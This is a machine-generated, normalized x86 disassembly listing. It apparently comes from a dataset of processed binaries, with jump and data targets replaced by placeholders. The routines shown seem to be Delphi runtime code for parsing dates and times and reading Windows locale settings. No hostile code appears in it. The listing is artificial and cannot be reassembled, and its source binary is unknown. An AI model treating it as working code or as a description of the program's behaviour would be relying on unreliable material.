call sub_409a9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409b14
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409a04
pop ecx
jmp r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
call sub_409a9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409c7c
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409a04
pop ecx
jmp r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
call sub_409a9c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a70
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
call sub_409ad4
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
call sub_409ad4
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
call sub_409ad4
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a70
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
call sub_409ad4
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409ad4
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40878c
test eax eax
jne r-xdata
push ebp
call sub_409a70
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d84
pop ecx
push ebp
call sub_409ad4
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409a24
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409a24
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409a24
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409a9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409a24
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409a24
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409a24
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409a24
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40878c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_4099c0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d84
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4099c0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4099c0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a04
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409934
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a04
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40878c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_4099c0
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_4099c0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a04
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409934
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a04
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c24c
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40878c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_4099c0
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d84
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409a24
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40878c
test eax eax
jne r-xdata
push ebp
call sub_409a9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409934
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a04
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a04
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a04
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c24c
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d84
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4099c0
pop ecx
jmp r-xdata
push ebp
call sub_409a9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409934
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a04
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40878c
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40878c
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40878c
test eax eax
jne r-xdata
jmp r-xdata
sub_40a538
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409d84
pop ecx
push ebp
mov eax ebx
call sub_409d84
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403fe8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a5a8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4041b8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a5cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a5a8
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4041b8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a660
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a6d9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a6e0
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a5a8
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4041b8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404418
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407d24
test eax eax
jne r-xdata
mov eax edi
call sub_4041b8
add [ esi ] eax
mov bl 0x1
sub_40a6ec
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a5a8
mov eax esi
call sub_4041b8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a724
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4041b8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a770
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4041b8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c290
mov [ ebx ] eax
jmp r-xdata
sub_40a7b8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4043b8
push eax
mov eax [ ebx ]
call sub_4043b8
pop edx
call sub_40c448
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a80c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_4099ac
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a868
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ab83
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a724
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c384
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a5cc
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a770
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404418
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407d94
mov eax [ ebp - 0x1c ]
call sub_40a7b8
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab8a
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f1c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6ec
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a5cc
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6ec
test al al
je r-xdata
call sub_4099ac
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a5cc
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4096d0
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4044fc
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6ec
mov edx ebx
mov eax esi
call sub_40a5a8
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4041b8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a770
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a80c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a5a8
mov eax esi
call sub_4041b8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_4099ac
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4041b8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404418
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407d24
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4041b8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404418
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407d24
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40abac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a660
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a660
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a660
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a5cc
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a5a8
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a660
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6ec
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a5cc
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a660
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6ec
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a5a8
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409588
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a660
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a5cc
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a660
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6ec
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a660
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a5cc
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ada0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40abac
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4041b8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40add4
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a868
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ada0
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4041b8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40abac
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ae60
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403fe8
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40aeac
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f4c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403fe8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40aef8
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40af20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40aeac
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405a5c
sub_40af5c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b06f
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40af20
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f4c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40af20
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f4c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40af20
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f4c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40af20
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f4c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b076
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f1c
retn
sub_40b080
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4040f0
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b0bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b121
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040f0
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_40800c
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b128
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
inc ebx
sub_40b134
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b1cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40aeac
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_40800c
